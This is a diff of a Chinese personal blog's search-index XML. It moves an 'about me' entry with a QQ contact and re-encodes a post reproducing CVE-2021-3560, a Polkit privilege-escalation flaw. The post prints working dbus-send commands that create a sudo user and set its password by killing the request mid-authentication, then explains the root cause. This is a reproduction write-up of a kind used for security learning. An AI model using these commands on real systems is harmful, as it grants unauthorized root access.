@@ -163,25 +163,6 @@
   
   
   <entry>
-    <title>关于我</title>
-    <link href="/article/9ff79b23.html"/>
-    <url>/article/9ff79b23.html</url>
-    
-    <content type="html"><![CDATA[<p>我</p><p>p1yang</p><p>21（年轻人，不讲武德）</p><p>rewirte战队成员（感谢我的几位好哥哥带我）</p><p>万年单身狗（有喜爱狗狗的小姐姐可以考虑下）</p><p>一个网络安全爱好者（师傅们带带我）</p><p>菜鸡（这是真的）</p><p>二进制玩家（这玩意好难，好难，好难！！！）</p><p>android开发专业废物（我ui画的贼溜）</p><p>复制诗歌爱好者（致橡树我真的太喜欢了！！！）</p><p>初音厨（即使离婚了我也爱她）</p><p>”日常“番爱好者（没有未来的未来不是我想要的未来）</p><p>正在学画本子的渣渣（哎嘿嘿）</p><p>英雄联盟万年黑铁（我闪现撞墙贼溜）</p><p>爹一只会窝在后排打狙（十倍镜都打不到人）</p><p>csgo皮肤收藏家（就是买不起而已，rush B gogogo！）</p><p>这个博客算是第二次迁移了吧，之前在云服务器上的也停了，文章也没来得及保存。</p><p>这里就算一个新的开始吧。</p><p>最后留个联系方式吧，师傅们有想要交流的技术或者不嫌弃我菜，一块耍爹1或者本人博文有问题的地方联系qq提醒我修改吧。</p><p>qq：397712823</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>杂七杂八的唠叨话</category>
-      
-    </categories>
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>CVE-2017-17215(华为HG532远程命令执行漏洞)</title>
     <link href="/article/3a44f1fa.html"/>
     <url>/article/3a44f1fa.html</url>
@@ -268,6 +249,25 @@
     <categories>
       
       <category>iot</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>关于我</title>
+    <link href="/article/9ff79b23.html"/>
+    <url>/article/9ff79b23.html</url>
+    
+    <content type="html"><![CDATA[<p>我</p><p>p1yang</p><p>21（年轻人，不讲武德）</p><p>rewirte战队成员（感谢我的几位好哥哥带我）</p><p>万年单身狗（有喜爱狗狗的小姐姐可以考虑下）</p><p>一个网络安全爱好者（师傅们带带我）</p><p>菜鸡（这是真的）</p><p>二进制玩家（这玩意好难，好难，好难！！！）</p><p>android开发专业废物（我ui画的贼溜）</p><p>复制诗歌爱好者（致橡树我真的太喜欢了！！！）</p><p>初音厨（即使离婚了我也爱她）</p><p>”日常“番爱好者（没有未来的未来不是我想要的未来）</p><p>正在学画本子的渣渣（哎嘿嘿）</p><p>英雄联盟万年黑铁（我闪现撞墙贼溜）</p><p>爹一只会窝在后排打狙（十倍镜都打不到人）</p><p>csgo皮肤收藏家（就是买不起而已，rush B gogogo！）</p><p>这个博客算是第二次迁移了吧，之前在云服务器上的也停了，文章也没来得及保存。</p><p>这里就算一个新的开始吧。</p><p>最后留个联系方式吧，师傅们有想要交流的技术或者不嫌弃我菜，一块耍爹1或者本人博文有问题的地方联系qq提醒我修改吧。</p><p>qq：397712823</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>杂七杂八的唠叨话</category>
       
     </categories>
     
@@ -433,7 +433,7 @@
     <link href="/article/86aaf27b.html"/>
     <url>/article/86aaf27b.html</url>
     
-    <content type="html"><![CDATA[<h1 id="CVE-2021-3560-Polkit权限提升漏洞"><a href="#CVE-2021-3560-Polkit权限提升漏洞" class="headerlink" title="CVE-2021-3560 Polkit权限提升漏洞"></a>CVE-2021-3560 Polkit权限提升漏洞</h1><p>6月3号，RedHat修复了一个存在七年的权限提升漏洞，该漏洞通过Linux  Polkit 来创建新的root用户</p><p>Polkit 是linux下的一个系统服务，允许特权进程给非特权进程提供服务</p><blockquote><p>Polkit 则会根据特权进程提供的信息和权限配置文件进行认证</p><p>认证完成后将认证结果返回给特权进程</p><p>特权进程会根据认证结果来决定是否给非特权进程提供服务</p><p>而我们在认证操作中断开连接，导致无法获取认证结果</p><p>具体后边会详细分析</p></blockquote><p>由于systemd使用Polkit，所以几乎所有使用systemd的Linux都自带polkit</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>环境：ubuntu20.04  </p><blockquote><p><a href="http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso">http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso</a> </p></blockquote><p>ssh（ 在本地ssh下操作）</p><blockquote><p>sudo apt install ssh</p><p>sudo service ssh start</p><p>ssh <a href="mailto:&#117;&#115;&#x65;&#114;&#x6e;&#x61;&#109;&#x65;&#64;&#x31;&#x32;&#55;&#x2e;&#x30;&#46;&#48;&#46;&#x31;">&#117;&#115;&#x65;&#114;&#x6e;&#x61;&#109;&#x65;&#64;&#x31;&#x32;&#55;&#x2e;&#x30;&#46;&#48;&#46;&#x31;</a></p></blockquote><p>具体为什么要用ssh，这里不做赘述，可以自行百度dbus</p><p>dbus-send发送D-Bus消息的工具，主要用于测试</p><p>可以通过dbus-send从命令行触发polkit</p><p>通过dbus-send构造语句，来创建一个新用户</p><blockquote><p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141819448.png" alt="image-20220402141819448"></p><p>正常情况返回肯定是认证不通过的</p><p>上面说了通过中断来实现认证通过</p><p>所以继续构造语句</p><blockquote><p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1 &amp; sleep 0.009s ; kill $!</p></blockquote><p>这里是开始执行后0.009秒断开连接</p><p>这里多久断开连接要看具体执行时间，可以在前面加time 测试</p><p>我这里大概时间在0.015秒左右，所以我提前在0.009秒断开，具体测试时看执行时间</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141825690.png" alt="image-20220402141825690"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141832450.png" alt="image-20220402141832450"></p><p>运气比较好，一次就成了，有个可能运气不太好，需要多试个千八百次的</p><p>然后用 id 可以看到语句中构造的yunku 已经存在了，而且在sudo组，具有root权限</p><p>现在已经成功利用漏洞创建了用户，但是该用户没有用户名，所以无法登陆</p><p>继续构造语句来设置密码</p><p><code>这里涉及到一个知识点，dbus接口设置密码需要通过散列值</code></p><p>通过openssl可以生成散列值(-5是指定 sha256 算法来生成散列值， -6 是 sha512，-1 是 md5)</p><blockquote><p>openssl passwd -5 password</p><p>(这里password是个人需要设置的密码)</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141841022.png" alt="image-20220402141841022"></p><p>构造设置密码语句(User1001 是创建的sudo用户uid 可以通过id 用户名查看， string 后放置密码散列值)</p><blockquote><p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts&#x2F;User1001 org.freedesktop.Accounts.User.SetPassword string:’$5$P28GOS55linQ0Fe&#x2F;$2dn4a1duWxR9wFIYeO7qfO7ieDZvE25zPh1oxm3&#x2F;Pn6’ string:Whatever &amp; sleep 0.009s ; kill $! </p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141847603.png" alt="image-20220402141847603"></p><p>多试这个也需要多试几次</p><p>成功之后可以登陆尝试</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141854349.png" alt="image-20220402141854349"></p><p>至此，复现结束！</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过dbus创建新用户时，dbus-send向account-daemon发起请求会先发送到dbus-daemon</p><p>dbus-daemon会先添加dbus id（这里方便理解 id为 10）到请求中，然后将请求发给account-daemon</p><p>account-daemon收到请求后向poklit询问id为10的连接有没有权限</p><p>poklit向dbus-daemon询问该连接的uid </p><p>如果返回的uid为0，就授权，否则打开验证密码窗口让用户输入密码</p><p>以上步骤完成后</p><p>poklit返回true给account-daemon</p><p>account-daemon创建新用户</p><p>但是！</p><p>如果我们在<code>poklit向dbus-daemon询问该连接的uid</code>时断开，那这个连接就不存在</p><p>不存在，就会返回错误</p><p>而poklit的错误处理信息不会拒绝该请求，而是将uid视为0，来授权</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="CVE-2021-3560-Polkit权限提升漏洞"><a href="#CVE-2021-3560-Polkit权限提升漏洞" class="headerlink" title="CVE-2021-3560 Polkit权限提升漏洞"></a>CVE-2021-3560 Polkit权限提升漏洞</h1><p>6月3号，RedHat修复了一个存在七年的权限提升漏洞，该漏洞通过Linux  Polkit 来创建新的root用户</p><p>Polkit 是linux下的一个系统服务，允许特权进程给非特权进程提供服务</p><blockquote><p>Polkit 则会根据特权进程提供的信息和权限配置文件进行认证</p><p>认证完成后将认证结果返回给特权进程</p><p>特权进程会根据认证结果来决定是否给非特权进程提供服务</p><p>而我们在认证操作中断开连接，导致无法获取认证结果</p><p>具体后边会详细分析</p></blockquote><p>由于systemd使用Polkit，所以几乎所有使用systemd的Linux都自带polkit</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>环境：ubuntu20.04  </p><blockquote><p><a href="http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso">http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso</a> </p></blockquote><p>ssh（ 在本地ssh下操作）</p><blockquote><p>sudo apt install ssh</p><p>sudo service ssh start</p><p>ssh <a href="mailto:&#117;&#115;&#x65;&#114;&#x6e;&#97;&#x6d;&#101;&#x40;&#49;&#50;&#x37;&#46;&#48;&#x2e;&#48;&#46;&#49;">&#117;&#115;&#x65;&#114;&#x6e;&#97;&#x6d;&#101;&#x40;&#49;&#50;&#x37;&#46;&#48;&#x2e;&#48;&#46;&#49;</a></p></blockquote><p>具体为什么要用ssh，这里不做赘述，可以自行百度dbus</p><p>dbus-send发送D-Bus消息的工具，主要用于测试</p><p>可以通过dbus-send从命令行触发polkit</p><p>通过dbus-send构造语句，来创建一个新用户</p><blockquote><p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141819448.png" alt="image-20220402141819448"></p><p>正常情况返回肯定是认证不通过的</p><p>上面说了通过中断来实现认证通过</p><p>所以继续构造语句</p><blockquote><p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1 &amp; sleep 0.009s ; kill $!</p></blockquote><p>这里是开始执行后0.009秒断开连接</p><p>这里多久断开连接要看具体执行时间，可以在前面加time 测试</p><p>我这里大概时间在0.015秒左右，所以我提前在0.009秒断开，具体测试时看执行时间</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141825690.png" alt="image-20220402141825690"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141832450.png" alt="image-20220402141832450"></p><p>运气比较好，一次就成了，有个可能运气不太好，需要多试个千八百次的</p><p>然后用 id 可以看到语句中构造的yunku 已经存在了，而且在sudo组，具有root权限</p><p>现在已经成功利用漏洞创建了用户，但是该用户没有用户名，所以无法登陆</p><p>继续构造语句来设置密码</p><p><code>这里涉及到一个知识点，dbus接口设置密码需要通过散列值</code></p><p>通过openssl可以生成散列值(-5是指定 sha256 算法来生成散列值， -6 是 sha512，-1 是 md5)</p><blockquote><p>openssl passwd -5 password</p><p>(这里password是个人需要设置的密码)</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141841022.png" alt="image-20220402141841022"></p><p>构造设置密码语句(User1001 是创建的sudo用户uid 可以通过id 用户名查看， string 后放置密码散列值)</p><blockquote><p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts&#x2F;User1001 org.freedesktop.Accounts.User.SetPassword string:’$5$P28GOS55linQ0Fe&#x2F;$2dn4a1duWxR9wFIYeO7qfO7ieDZvE25zPh1oxm3&#x2F;Pn6’ string:Whatever &amp; sleep 0.009s ; kill $! </p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141847603.png" alt="image-20220402141847603"></p><p>多试这个也需要多试几次</p><p>成功之后可以登陆尝试</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141854349.png" alt="image-20220402141854349"></p><p>至此，复现结束！</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过dbus创建新用户时，dbus-send向account-daemon发起请求会先发送到dbus-daemon</p><p>dbus-daemon会先添加dbus id（这里方便理解 id为 10）到请求中，然后将请求发给account-daemon</p><p>account-daemon收到请求后向poklit询问id为10的连接有没有权限</p><p>poklit向dbus-daemon询问该连接的uid </p><p>如果返回的uid为0，就授权，否则打开验证密码窗口让用户输入密码</p><p>以上步骤完成后</p><p>poklit返回true给account-daemon</p><p>account-daemon创建新用户</p><p>但是！</p><p>如果我们在<code>poklit向dbus-daemon询问该连接的uid</code>时断开，那这个连接就不存在</p><p>不存在，就会返回错误</p><p>而poklit的错误处理信息不会拒绝该请求，而是将uid视为0，来授权</p>]]></content>
     
     
     <categories>
